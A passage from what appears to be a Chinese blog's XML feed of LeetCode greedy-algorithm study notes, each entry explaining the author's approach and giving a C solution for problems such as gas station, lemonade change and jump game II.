    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/monotone-increasing-digits</p><p>我的思路是，先将每一位数保存在一个数组中，然后遍历数组进行判断。这题只要想明白变化规律就很简单。</p><ul><li>从低位开始遍历，将每一个数字保存到辅助数组<code>number</code>中</li><li>然后从原数的低位开始遍历数组（顺序遍历数组），遇到不符合条件的数字，则该数字减1，然后该数字之后的<strong>低位数字</strong>全置为9</li><li>最后再次遍历变化后的数组，累加（不是简单累加，每一次需要乘10）得到结果</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">monotoneIncreasingDigits</span><span class="params">(<span class="type">int</span> n)</span> {</span><br><span class="line">    <span class="keyword">if</span>(n/<span class="number">10</span>==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> n; <span class="comment">//若只有一位数，则直接返回</span></span><br><span class="line">    <span class="type">int</span> number[<span class="number">10</span>]; <span class="comment">//保存每一位上的数字</span></span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>; <span class="comment">//记录结果值</span></span><br><span class="line">    <span class="type">int</span> index=<span class="number">0</span>; <span class="comment">//记录数字位数</span></span><br><span class="line">    <span class="keyword">while</span>(n/<span class="number">10</span>!=<span class="number">0</span>) {</span><br><span class="line">        number[index++] = n%<span class="number">10</span>;</span><br><span class="line">        n = n/<span class="number">10</span>;</span><br><span class="line">    }</span><br><span class="line">    number[index++] = n%<span class="number">10</span>; <span class="comment">//不要遗漏最高位上的数字</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;index<span class="number">-1</span>; i++) { </span><br><span class="line">        <span class="keyword">if</span>(number[i+<span class="number">1</span>]&gt;number[i]) { <span class="comment">//若不满足递增，则进行处理</span></span><br><span class="line">            number[i+<span class="number">1</span>]--;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;i+<span class="number">1</span>; j++) <span class="comment">//该位之后的低位全置为9</span></span><br><span class="line">                number[j] = <span class="number">9</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=index<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--) {</span><br><span class="line">        res = number[i] + res*<span class="number">10</span>; <span class="comment">//注意每次乘以10</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>划分字母区间</title>
    <link href="/2024/03/07/%E5%88%92%E5%88%86%E5%AD%97%E6%AF%8D%E5%8C%BA%E9%97%B4/"/>
    <url>/2024/03/07/%E5%88%92%E5%88%86%E5%AD%97%E6%AF%8D%E5%8C%BA%E9%97%B4/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/partition-labels/</p><p>我原本的思路类似于前面两题<a href="https://programmercarl.com/0452.用最少数量的箭引爆气球.html">用最少数量的箭引爆气球</a>、<a href="https://programmercarl.com/0435.无重叠区间.html">无重叠区间</a>，先将每个字母对应的起始位置和结束位置记录下来，然后按照起始位置升序，接着比较结束位置。</p><p>这个思路是正确的，但是我不会使用qsort对结构体进行排序，所以就按照代码随想录的思路完成了该题。</p><ul><li>定义一个辅助数组<code>p[26]</code>（哈希表），将字母的终止位置记录为辅助数组对应下标（a-0,b-1...）的元素</li><li>遍历字符串，记录当前最大的终止位置<code>right</code>，当遍历位置与<code>right</code>重合时，说明可以在此处进行划分，记录划分长度<code>right-left+1</code>，同时更新<code>left = right+1</code></li><li>重复第二步操作</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="title function_">partitionLabels</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span>* returnSize)</span> {</span><br><span class="line">    <span class="type">int</span> p[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++) {</span><br><span class="line">        p[s[i]-<span class="string">'a'</span>] = i;</span><br><span class="line">    }</span><br><span class="line">    <span class="type">int</span>* res = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="built_in">strlen</span>(s));</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right = <span class="number">0</span>, left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++) {</span><br><span class="line">        right = right&gt;p[s[i]-<span class="string">'a'</span>]?right:p[s[i]-<span class="string">'a'</span>]; <span class="comment">//记录最大终止位置</span></span><br><span class="line">        <span class="keyword">if</span>(i == right) {</span><br><span class="line">            res[(*returnSize)++] = right - left + <span class="number">1</span>; <span class="comment">//记录划分长度</span></span><br><span class="line">            left = i+<span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用最少数量的箭射爆气球</title>
    <link href="/2024/03/07/%E7%94%A8%E6%9C%80%E5%B0%91%E6%95%B0%E9%87%8F%E7%9A%84%E7%AE%AD%E5%B0%84%E7%88%86%E6%B0%94%E7%90%83/"/>
    <url>/2024/03/07/%E7%94%A8%E6%9C%80%E5%B0%91%E6%95%B0%E9%87%8F%E7%9A%84%E7%AE%AD%E5%B0%84%E7%88%86%E6%B0%94%E7%90%83/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/minimum-number-of-arrows-to-burst-balloons/</p><p>通过给定坐标的范围判断可同时射爆几个气球，并记录射出的箭的数量。</p><ul><li>先按照坐标的起始值升序排列，若起始值相同则比较终止值</li><li>使用变量<code>tmp</code>记录第一个气球坐标的终止值</li><li>从下标为1的气球开始for循环遍历，若<code>tmp</code>大于等于当前气球的起始值，则说明两个气球有重合部分，同时更新<code>tmp</code>为终止值较小的那个值</li><li>若<code>tmp</code>小于等于当前气球起始值，则需要增加弓箭数量</li></ul><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20201123101929791.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> {</span><br><span class="line">    <span class="type">int</span>* p1 = *(<span class="type">int</span>**)a;</span><br><span class="line">    <span class="type">int</span>* p2 = *(<span class="type">int</span>**)b;</span><br><span class="line">    <span class="keyword">if</span>(p1[<span class="number">0</span>] != p2[<span class="number">0</span>]) <span class="comment">//若使用 p1[0]-p2[0]!=0，可能会溢出</span></span><br><span class="line">        <span class="keyword">return</span> p1[<span class="number">0</span>]&gt;p2[<span class="number">0</span>]?<span class="number">1</span>:<span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> p1[<span class="number">1</span>]&gt;p2[<span class="number">1</span>]?<span class="number">1</span>:<span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">findMinArrowShots</span><span class="params">(<span class="type">int</span>** points, <span class="type">int</span> pointsSize, <span class="type">int</span>* pointsColSize)</span>{</span><br><span class="line">    qsort(points, pointsSize, <span class="keyword">sizeof</span>(points[<span class="number">0</span>]), cmp);</span><br><span class="line">    <span class="type">int</span> count=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> tmp = points[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;pointsSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(tmp&gt;=points[i][<span class="number">0</span>]) {</span><br><span class="line">            <span class="keyword">if</span>(tmp&gt;=points[i][<span class="number">1</span>])</span><br><span class="line">                tmp = points[i][<span class="number">1</span>]; <span class="comment">//将tmp设为较小的终止值</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            count++;</span><br><span class="line">            tmp = points[i][<span class="number">1</span>];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>根据身高重建队列</title>
    <link href="/2024/03/06/%E6%A0%B9%E6%8D%AE%E8%BA%AB%E9%AB%98%E9%87%8D%E5%BB%BA%E9%98%9F%E5%88%97/"/>
    <url>/2024/03/06/%E6%A0%B9%E6%8D%AE%E8%BA%AB%E9%AB%98%E9%87%8D%E5%BB%BA%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/queue-reconstruction-by-height</p><p>没有思路，直接参考代码随想录的思路：</p><ul><li><p>首先直接按照<strong>身高降序</strong>排列，若身高相同，则比较<code>k</code>值（<code>k</code>值小的在前面）</p><blockquote><p>因为题目中的<code>k</code>是排在当前这个人<strong>前面</strong>的<strong>身高更高或者相同</strong>的人数</p></blockquote></li><li><p>然后遍历重新排序后的<code>people</code>数组，把当前位置与<code>k</code>对应不上的人往前插，同时不改变其他人的顺序</p></li></ul><blockquote><p>第19行代码中的pos一定小于i，因为k可能有重复的，但pos固定</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> {</span><br><span class="line">    <span class="type">int</span>* p1 = *(<span class="type">int</span>**)a;</span><br><span class="line">    <span class="type">int</span>* p2 = *(<span class="type">int</span>**)b;</span><br><span class="line">    <span class="comment">//按照身高降序，若身高相同则按k升序</span></span><br><span class="line">    <span class="keyword">return</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] ? p1[<span class="number">1</span>] - p2[<span class="number">1</span>] : p2[<span class="number">0</span>] - p1[<span class="number">0</span>];</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span>** people, <span class="type">int</span> start, <span class="type">int</span> end)</span> { <span class="comment">//插入元素</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=end; i&gt;start; i--) {</span><br><span class="line">        people[i] = people[i<span class="number">-1</span>];</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>** <span class="title function_">reconstructQueue</span><span class="params">(<span class="type">int</span>** people, <span class="type">int</span> peopleSize, <span class="type">int</span>* peopleColSize, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    qsort(people, peopleSize, <span class="keyword">sizeof</span>(people[<span class="number">0</span>]), cmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;peopleSize; i++) {</span><br><span class="line">        <span class="type">int</span>* tmp = people[i]; <span class="comment">//暂存当前位置的人</span></span><br><span class="line">        <span class="type">int</span> pos = people[i][<span class="number">1</span>]; <span class="comment">//记录当前位置</span></span><br><span class="line">        insert(people, pos, i); <span class="comment">//从当前位置到i-1的人往后移动一位，然后再将当前这个人插入对应的位置</span></span><br><span class="line">        people[pos] = tmp;</span><br><span class="line">    }</span><br><span class="line">    *returnSize = peopleSize;</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(*returnSize));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(*returnSize); i++) {</span><br><span class="line">        (*returnColumnSizes)[i] = *peopleColSize;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> people;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>柠檬水找零</title>
    <link href="/2024/03/06/%E6%9F%A0%E6%AA%AC%E6%B0%B4%E6%89%BE%E9%9B%B6/"/>
    <url>/2024/03/06/%E6%9F%A0%E6%AA%AC%E6%B0%B4%E6%89%BE%E9%9B%B6/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/lemonade-change/</p><p>这题是简单题，但是没想出来，看了代码随想录恍然大悟，通过统计<code>5</code>美元和<code>10</code>美元的个数来判断能否成功找零。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">lemonadeChange</span><span class="params">(<span class="type">int</span>* bills, <span class="type">int</span> billsSize)</span> {</span><br><span class="line">    <span class="keyword">if</span>(bills[<span class="number">0</span>]!=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> sum_5 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> sum_10 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;billsSize; i++) {</span><br><span class="line">        <span class="keyword">if</span>(bills[i]==<span class="number">5</span>) <span class="comment">//若收到5美元，直接入账并更新数量</span></span><br><span class="line">            sum_5++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(bills[i]==<span class="number">10</span>) { <span class="comment">//若收到10美元，判断是否有5美元用来找零</span></span><br><span class="line">            sum_10++;</span><br><span class="line">            <span class="keyword">if</span>(sum_5&lt;=<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            sum_5--; <span class="comment">//成功找零后，更新数量</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> { <span class="comment">//收到20美元</span></span><br><span class="line">            <span class="keyword">if</span>(sum_5 == <span class="number">0</span> &amp;&amp; sum_10 &gt;= <span class="number">0</span>) <span class="comment">//只有10美元，无法找零</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(sum_5&lt;<span class="number">3</span> &amp;&amp; sum_10==<span class="number">0</span>) <span class="comment">//5美元少于3个，无法找零</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(sum_10 &gt; <span class="number">0</span>) { <span class="comment">//若有10美元找零，优先使用</span></span><br><span class="line">                sum_10--;</span><br><span class="line">                sum_5--;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> <span class="comment">//只有5美元，减少3个</span></span><br><span class="line">                sum_5-=<span class="number">3</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加油站</title>
    <link href="/2024/03/06/%E5%8A%A0%E6%B2%B9%E7%AB%99/"/>
    <url>/2024/03/06/%E5%8A%A0%E6%B2%B9%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/gas-station/</p><p>直接暴力求解，通过二重循环，遍历以不同加油站为起点的路径，难点在于如何用循环模拟出数组环路（从当前元素向后遍历直到再次遍历到该元素）</p><ul><li><p>第一重for循环以不同加油站为起点，每更换一个起点，<code>sumGas</code>和<code>sumCost</code>都初始化为0，统计以当前加油站为起点的路径上的<strong>累加的油量</strong>和<strong>消耗的油量</strong></p></li><li><p>第二重循环使用while，<code>i</code>从0开始，<code>(start+i) % gasSize</code>表示路径上的加油站，<code>i</code>的范围是0 ~ gasSize-1 ，正好能够形成一个环路</p></li><li><p>若当前路径上累加的油量小于消耗的油量，则<strong>退出当前while循环</strong>，以下一个加油站为起点继续；否则，当前路径成立并判断下一个加油站是否满足条件（<code>i++</code>）</p></li><li><p>退出while循环后，判断当前路径是否包含所有加油站，若包含，则返回<code>start</code>起点加油站；否则以<strong>第一个无法到达的加油站</strong>为起点继续（for循环）</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20230117165628.png"></p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">canCompleteCircuit</span><span class="params">(<span class="type">int</span>* gas, <span class="type">int</span> gasSize, <span class="type">int</span>* cost, <span class="type">int</span> costSize)</span> {</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> start=<span class="number">0</span>; start&lt;gasSize; ) { <span class="comment">//起点加油站</span></span><br><span class="line">        <span class="type">int</span> sumGas = <span class="number">0</span>, sumCost = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;gasSize) {</span><br><span class="line">            <span class="type">int</span> j = (start + i) % gasSize; </span><br><span class="line">            sumGas += gas[j]; <span class="comment">//记录当前路径添加的油量</span></span><br><span class="line">            sumCost += cost[j]; <span class="comment">//记录当前路径消耗的油量</span></span><br><span class="line">            <span class="keyword">if</span>(sumGas &lt; sumCost) <span class="comment">//油量不够，退出while循环</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            i++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(i == gasSize) <span class="comment">//路径包含所有加油站，则返回起点加油站</span></span><br><span class="line">            <span class="keyword">return</span> start;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//否则将起点定为第一个无法到达的加油站</span></span><br><span class="line">            start = start+i+<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>K次取反后最大化的数组和</title>
    <link href="/2024/03/06/K%E6%AC%A1%E5%8F%96%E5%8F%8D%E5%90%8E%E6%9C%80%E5%A4%A7%E5%8C%96%E7%9A%84%E6%95%B0%E7%BB%84%E5%92%8C/"/>
    <url>/2024/03/06/K%E6%AC%A1%E5%8F%96%E5%8F%8D%E5%90%8E%E6%9C%80%E5%A4%A7%E5%8C%96%E7%9A%84%E6%95%B0%E7%BB%84%E5%92%8C/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/maximize-sum-of-array-after-k-negations/</p><p>注意题中的取反可以作用于同一个元素。首先需要对原数组进行升序排序，一共分为三种情况：</p><ul><li>最小值为<strong>负数</strong>：若k&gt;0，则将最小值取反</li><li>最小值为<strong>0</strong>：取反作用在0上，相当于不变，因此可直接计算数组和</li><li>最小值为<strong>正数</strong>：若k&gt;0，则将最小值取反</li></ul><p>上述步骤对应局部最优，使用for循环每次取反后对数组重新排序，最后得到全局最优</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span>{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span>*)a-*(<span class="type">int</span>*)b;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">largestSumAfterKNegations</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> k)</span> {</span><br><span class="line">    qsort(nums, numsSize, <span class="keyword">sizeof</span>(<span class="type">int</span>), cmp);  <span class="comment">//排序</span></span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;k;) { <span class="comment">//k为0时，退出循环</span></span><br><span class="line">        <span class="keyword">if</span>(nums[i]==<span class="number">0</span>) <span class="comment">//最小值为0，则直接退出，然后求和</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            nums[i] = (<span class="number">-1</span>)*nums[i]; <span class="comment">//取反</span></span><br><span class="line">            k--;</span><br><span class="line">            qsort(nums, numsSize, <span class="keyword">sizeof</span>(<span class="type">int</span>), cmp); <span class="comment">//重新排序</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {</span><br><span class="line">        sum+=nums[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>跳跃游戏II</title>
    <link href="/2024/03/06/%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8FII/"/>
    <url>/2024/03/06/%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8FII/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/jump-game-ii/</p><p>贪心算法：</p><ul><li>记录<strong>当前元素</strong>能到达的最大下标<code>currentMaxIn</code>，记录<strong>遍历过的元素</strong>所能到达的<strong>最大</strong>下标<code>maxIndex</code></li><li>上述变量中，<code>maxIndex</code>需要不断比较以保持最大值，而当遍历到的元素下标为<code>currentMaxIn</code>时（<code>currentMaxIn</code>未到达数组最后一个下标且还没更新<code>maxIndex</code>），<code>maxIndex</code>还未到达数组最大下标，则需要增加步数</li></ul><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20201201232309103.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">jump</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line">    <span class="keyword">if</span>(numsSize==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxIndex=<span class="number">0</span>; <span class="comment">//遍历过的元素中到达的最大下标</span></span><br><span class="line">    <span class="type">int</span> currentMaxIn = <span class="number">0</span>; <span class="comment">//当前元素能到达的最大下标</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;numsSize; i++) {</span><br><span class="line">        maxIndex = maxIndex &lt; nums[i]+i ? nums[i]+i : maxIndex;</span><br><span class="line">        <span class="keyword">if</span>(i == currentMaxIn) { <span class="comment">//若此时已遍历到currentMaxIn，则更新步数</span></span><br><span class="line">            count++;</span><br><span class="line">            currentMaxIn = maxIndex; <span class="comment">//更新下一个步元素能够到达的最大位置</span></span><br><span class="line">            <span class="keyword">if</span>(maxIndex &gt;= numsSize<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>跳跃游戏</title>
    <link href="/2024/03/05/%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8F/"/>
    <url>/2024/03/05/%E8%B7%B3%E8%B7%83%E6%B8%B8%E6%88%8F/</url>
    
